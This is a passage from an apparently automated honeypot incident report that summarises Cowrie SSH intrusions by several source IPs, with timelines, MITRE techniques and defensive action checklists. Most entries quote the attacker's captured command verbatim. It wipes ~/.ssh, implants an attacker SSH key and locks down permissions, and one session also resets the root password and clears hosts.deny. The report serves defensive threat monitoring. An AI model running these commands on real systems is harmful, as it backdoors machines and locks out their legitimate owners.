| `2026-06-10 13:28:27` | `cowrie.log.closed` |
| `2026-06-10 13:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.154[.]88` to AbuseIPDB if not already reported
- [ ] Block `120.48.154[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55cd90c0f21f

| Field | Detail |
|---|---|
| **Source IP** | `120.48.154[.]88` |
| **First Seen** | 2026-06-10 13:28 |
| **Last Seen** | 2026-06-10 13:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:28:30` | `cowrie.session.connect` |
| `2026-06-10 13:28:30` | `cowrie.client.version` |
| `2026-06-10 13:28:30` | `cowrie.client.kex` |
| `2026-06-10 13:28:32` | `cowrie.login.success` |
| `2026-06-10 13:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.154[.]88` to AbuseIPDB if not already reported
- [ ] Block `120.48.154[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-863fc6a1aedf

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-06-10 13:30 |
| **Last Seen** | 2026-06-10 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:30:16` | `cowrie.session.connect` |
| `2026-06-10 13:30:16` | `cowrie.client.version` |
| `2026-06-10 13:30:16` | `cowrie.client.kex` |
| `2026-06-10 13:30:16` | `cowrie.login.success` |
| `2026-06-10 13:30:16` | `cowrie.session.params` |
| `2026-06-10 13:30:16` | `cowrie.command.input` |
| `2026-06-10 13:30:16` | `cowrie.command.failed` |
| `2026-06-10 13:30:16` | `cowrie.log.closed` |
| `2026-06-10 13:30:16` | `cowrie.session.params` |
| `2026-06-10 13:30:16` | `cowrie.command.input` |
| `2026-06-10 13:30:16` | `cowrie.session.file_download` |
| `2026-06-10 13:30:16` | `cowrie.log.closed` |
| `2026-06-10 13:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9122b58166fb

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-06-10 13:30 |
| **Last Seen** | 2026-06-10 13:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:30:18` | `cowrie.session.connect` |
| `2026-06-10 13:30:18` | `cowrie.client.version` |
| `2026-06-10 13:30:18` | `cowrie.client.kex` |
| `2026-06-10 13:30:18` | `cowrie.login.success` |
| `2026-06-10 13:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f148ce26c91

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-06-10 13:34 |
| **Last Seen** | 2026-06-10 13:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:34:56` | `cowrie.session.connect` |
| `2026-06-10 13:34:56` | `cowrie.client.version` |
| `2026-06-10 13:34:56` | `cowrie.client.kex` |
| `2026-06-10 13:34:56` | `cowrie.login.success` |
| `2026-06-10 13:34:57` | `cowrie.session.params` |
| `2026-06-10 13:34:57` | `cowrie.command.input` |
| `2026-06-10 13:34:57` | `cowrie.command.failed` |
| `2026-06-10 13:34:57` | `cowrie.log.closed` |
| `2026-06-10 13:34:57` | `cowrie.session.params` |
| `2026-06-10 13:34:57` | `cowrie.command.input` |
| `2026-06-10 13:34:57` | `cowrie.session.file_download` |
| `2026-06-10 13:34:57` | `cowrie.log.closed` |
| `2026-06-10 13:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5f1c54f6ea0

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-06-10 13:35 |
| **Last Seen** | 2026-06-10 13:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:35:00` | `cowrie.session.connect` |
| `2026-06-10 13:35:00` | `cowrie.client.version` |
| `2026-06-10 13:35:00` | `cowrie.client.kex` |
| `2026-06-10 13:35:00` | `cowrie.login.success` |
| `2026-06-10 13:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17d361674eaf

| Field | Detail |
|---|---|
| **Source IP** | `118.145.237[.]236` |
| **First Seen** | 2026-06-10 13:38 |
| **Last Seen** | 2026-06-10 13:39 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:IPVJVaUHB2Pi"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:38:49` | `cowrie.session.connect` |
| `2026-06-10 13:38:50` | `cowrie.client.version` |
| `2026-06-10 13:38:50` | `cowrie.client.kex` |
| `2026-06-10 13:38:51` | `cowrie.login.success` |
| `2026-06-10 13:38:51` | `cowrie.session.params` |
| `2026-06-10 13:38:51` | `cowrie.command.input` |
| `2026-06-10 13:38:51` | `cowrie.command.failed` |
| `2026-06-10 13:38:51` | `cowrie.log.closed` |
| `2026-06-10 13:38:52` | `cowrie.session.params` |
| `2026-06-10 13:38:52` | `cowrie.command.input` |
| `2026-06-10 13:38:52` | `cowrie.session.file_download` |
| `2026-06-10 13:38:52` | `cowrie.log.closed` |
| `2026-06-10 13:39:12` | `cowrie.session.params` |
| `2026-06-10 13:39:12` | `cowrie.command.input` |
| `2026-06-10 13:39:12` | `cowrie.log.closed` |
| `2026-06-10 13:39:12` | `cowrie.session.params` |
| `2026-06-10 13:39:12` | `cowrie.command.input` |
| `2026-06-10 13:39:12` | `cowrie.log.closed` |
| `2026-06-10 13:39:12` | `cowrie.session.params` |
| `2026-06-10 13:39:12` | `cowrie.command.input` |
| `2026-06-10 13:39:13` | `cowrie.session.file_download` |
| `2026-06-10 13:39:13` | `cowrie.log.closed` |
| `2026-06-10 13:39:13` | `cowrie.session.params` |
| `2026-06-10 13:39:13` | `cowrie.command.input` |
| `2026-06-10 13:39:13` | `cowrie.log.closed` |
| `2026-06-10 13:39:13` | `cowrie.session.params` |
| `2026-06-10 13:39:13` | `cowrie.command.input` |
| `2026-06-10 13:39:13` | `cowrie.log.closed` |
| `2026-06-10 13:39:14` | `cowrie.session.params` |
| `2026-06-10 13:39:14` | `cowrie.command.input` |
| `2026-06-10 13:39:14` | `cowrie.command.input` |
| `2026-06-10 13:39:14` | `cowrie.log.closed` |
| `2026-06-10 13:39:14` | `cowrie.session.params` |
| `2026-06-10 13:39:14` | `cowrie.command.input` |
| `2026-06-10 13:39:14` | `cowrie.log.closed` |
| `2026-06-10 13:39:15` | `cowrie.session.params` |
| `2026-06-10 13:39:15` | `cowrie.command.input` |
| `2026-06-10 13:39:15` | `cowrie.log.closed` |
| `2026-06-10 13:39:15` | `cowrie.session.params` |
| `2026-06-10 13:39:15` | `cowrie.command.input` |
| `2026-06-10 13:39:15` | `cowrie.log.closed` |
| `2026-06-10 13:39:16` | `cowrie.session.params` |
| `2026-06-10 13:39:16` | `cowrie.command.input` |
| `2026-06-10 13:39:16` | `cowrie.log.closed` |
| `2026-06-10 13:39:16` | `cowrie.session.params` |
| `2026-06-10 13:39:16` | `cowrie.command.input` |
| `2026-06-10 13:39:16` | `cowrie.log.closed` |
| `2026-06-10 13:39:16` | `cowrie.session.params` |
| `2026-06-10 13:39:16` | `cowrie.command.input` |
| `2026-06-10 13:39:17` | `cowrie.log.closed` |
| `2026-06-10 13:39:17` | `cowrie.session.params` |
| `2026-06-10 13:39:17` | `cowrie.command.input` |
| `2026-06-10 13:39:17` | `cowrie.log.closed` |
| `2026-06-10 13:39:17` | `cowrie.session.params` |
| `2026-06-10 13:39:17` | `cowrie.command.input` |
| `2026-06-10 13:39:17` | `cowrie.log.closed` |
| `2026-06-10 13:39:18` | `cowrie.session.params` |
| `2026-06-10 13:39:18` | `cowrie.command.input` |
| `2026-06-10 13:39:18` | `cowrie.log.closed` |
| `2026-06-10 13:39:18` | `cowrie.session.params` |
| `2026-06-10 13:39:18` | `cowrie.command.input` |
| `2026-06-10 13:39:18` | `cowrie.log.closed` |
| `2026-06-10 13:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.237[.]236` to AbuseIPDB if not already reported
- [ ] Block `118.145.237[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91911ba24c22

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 13:41 |
| **Last Seen** | 2026-06-10 13:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:41:50` | `cowrie.session.connect` |
| `2026-06-10 13:41:50` | `cowrie.client.version` |
| `2026-06-10 13:41:50` | `cowrie.client.kex` |
| `2026-06-10 13:41:51` | `cowrie.login.success` |
| `2026-06-10 13:41:51` | `cowrie.session.params` |
| `2026-06-10 13:41:51` | `cowrie.command.input` |
| `2026-06-10 13:41:51` | `cowrie.command.failed` |
| `2026-06-10 13:41:52` | `cowrie.log.closed` |
| `2026-06-10 13:41:52` | `cowrie.session.params` |
| `2026-06-10 13:41:52` | `cowrie.command.input` |
| `2026-06-10 13:41:52` | `cowrie.session.file_download` |
| `2026-06-10 13:41:52` | `cowrie.log.closed` |
| `2026-06-10 13:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b72491961f5

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 13:41 |
| **Last Seen** | 2026-06-10 13:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:41:54` | `cowrie.session.connect` |
| `2026-06-10 13:41:54` | `cowrie.client.version` |
| `2026-06-10 13:41:54` | `cowrie.client.kex` |
| `2026-06-10 13:41:55` | `cowrie.login.success` |
| `2026-06-10 13:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4efda275f53

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 13:47 |
| **Last Seen** | 2026-06-10 13:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:47:18` | `cowrie.session.connect` |
| `2026-06-10 13:47:18` | `cowrie.client.version` |
| `2026-06-10 13:47:18` | `cowrie.client.kex` |
| `2026-06-10 13:47:19` | `cowrie.login.success` |
| `2026-06-10 13:47:19` | `cowrie.session.params` |
| `2026-06-10 13:47:19` | `cowrie.command.input` |
| `2026-06-10 13:47:19` | `cowrie.command.failed` |
| `2026-06-10 13:47:19` | `cowrie.log.closed` |
| `2026-06-10 13:47:20` | `cowrie.session.params` |
| `2026-06-10 13:47:20` | `cowrie.command.input` |
| `2026-06-10 13:47:20` | `cowrie.session.file_download` |
| `2026-06-10 13:47:20` | `cowrie.log.closed` |
| `2026-06-10 13:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddaa847149ce

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 13:47 |
| **Last Seen** | 2026-06-10 13:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:47:22` | `cowrie.session.connect` |
| `2026-06-10 13:47:22` | `cowrie.client.version` |
| `2026-06-10 13:47:22` | `cowrie.client.kex` |
| `2026-06-10 13:47:23` | `cowrie.login.success` |
| `2026-06-10 13:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e30e055cc2b0

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 13:49 |
| **Last Seen** | 2026-06-10 13:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:49:08` | `cowrie.session.connect` |
| `2026-06-10 13:49:08` | `cowrie.client.version` |
| `2026-06-10 13:49:08` | `cowrie.client.kex` |
| `2026-06-10 13:49:09` | `cowrie.login.success` |
| `2026-06-10 13:49:09` | `cowrie.session.params` |
| `2026-06-10 13:49:09` | `cowrie.command.input` |
| `2026-06-10 13:49:09` | `cowrie.command.failed` |
| `2026-06-10 13:49:10` | `cowrie.log.closed` |
| `2026-06-10 13:49:10` | `cowrie.session.params` |
| `2026-06-10 13:49:10` | `cowrie.command.input` |
| `2026-06-10 13:49:10` | `cowrie.session.file_download` |
| `2026-06-10 13:49:10` | `cowrie.log.closed` |
| `2026-06-10 13:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae8999447632

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 13:49 |
| **Last Seen** | 2026-06-10 13:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:49:12` | `cowrie.session.connect` |
| `2026-06-10 13:49:12` | `cowrie.client.version` |
| `2026-06-10 13:49:12` | `cowrie.client.kex` |
| `2026-06-10 13:49:13` | `cowrie.login.success` |
| `2026-06-10 13:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa6852e5f7dc

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 14:07 |
| **Last Seen** | 2026-06-10 14:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 14:07:36` | `cowrie.session.connect` |
| `2026-06-10 14:07:36` | `cowrie.client.version` |
| `2026-06-10 14:07:36` | `cowrie.client.kex` |
| `2026-06-10 14:07:37` | `cowrie.login.success` |
| `2026-06-10 14:07:37` | `cowrie.session.params` |
| `2026-06-10 14:07:37` | `cowrie.command.input` |
| `2026-06-10 14:07:37` | `cowrie.command.failed` |
| `2026-06-10 14:07:37` | `cowrie.log.closed` |
| `2026-06-10 14:07:38` | `cowrie.session.params` |
| `2026-06-10 14:07:38` | `cowrie.command.input` |
| `2026-06-10 14:07:38` | `cowrie.session.file_download` |
| `2026-06-10 14:07:38` | `cowrie.log.closed` |
| `2026-06-10 14:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae3b00c68e4d

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 14:07 |
| **Last Seen** | 2026-06-10 14:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 14:07:40` | `cowrie.session.connect` |
| `2026-06-10 14:07:40` | `cowrie.client.version` |
| `2026-06-10 14:07:40` | `cowrie.client.kex` |
| `2026-06-10 14:07:41` | `cowrie.login.success` |
| `2026-06-10 14:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]57` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8751eaa880ce

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]57` |
| **First Seen** | 2026-06-10 14:09 |
| **Last Seen** | 2026-06-10 14:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
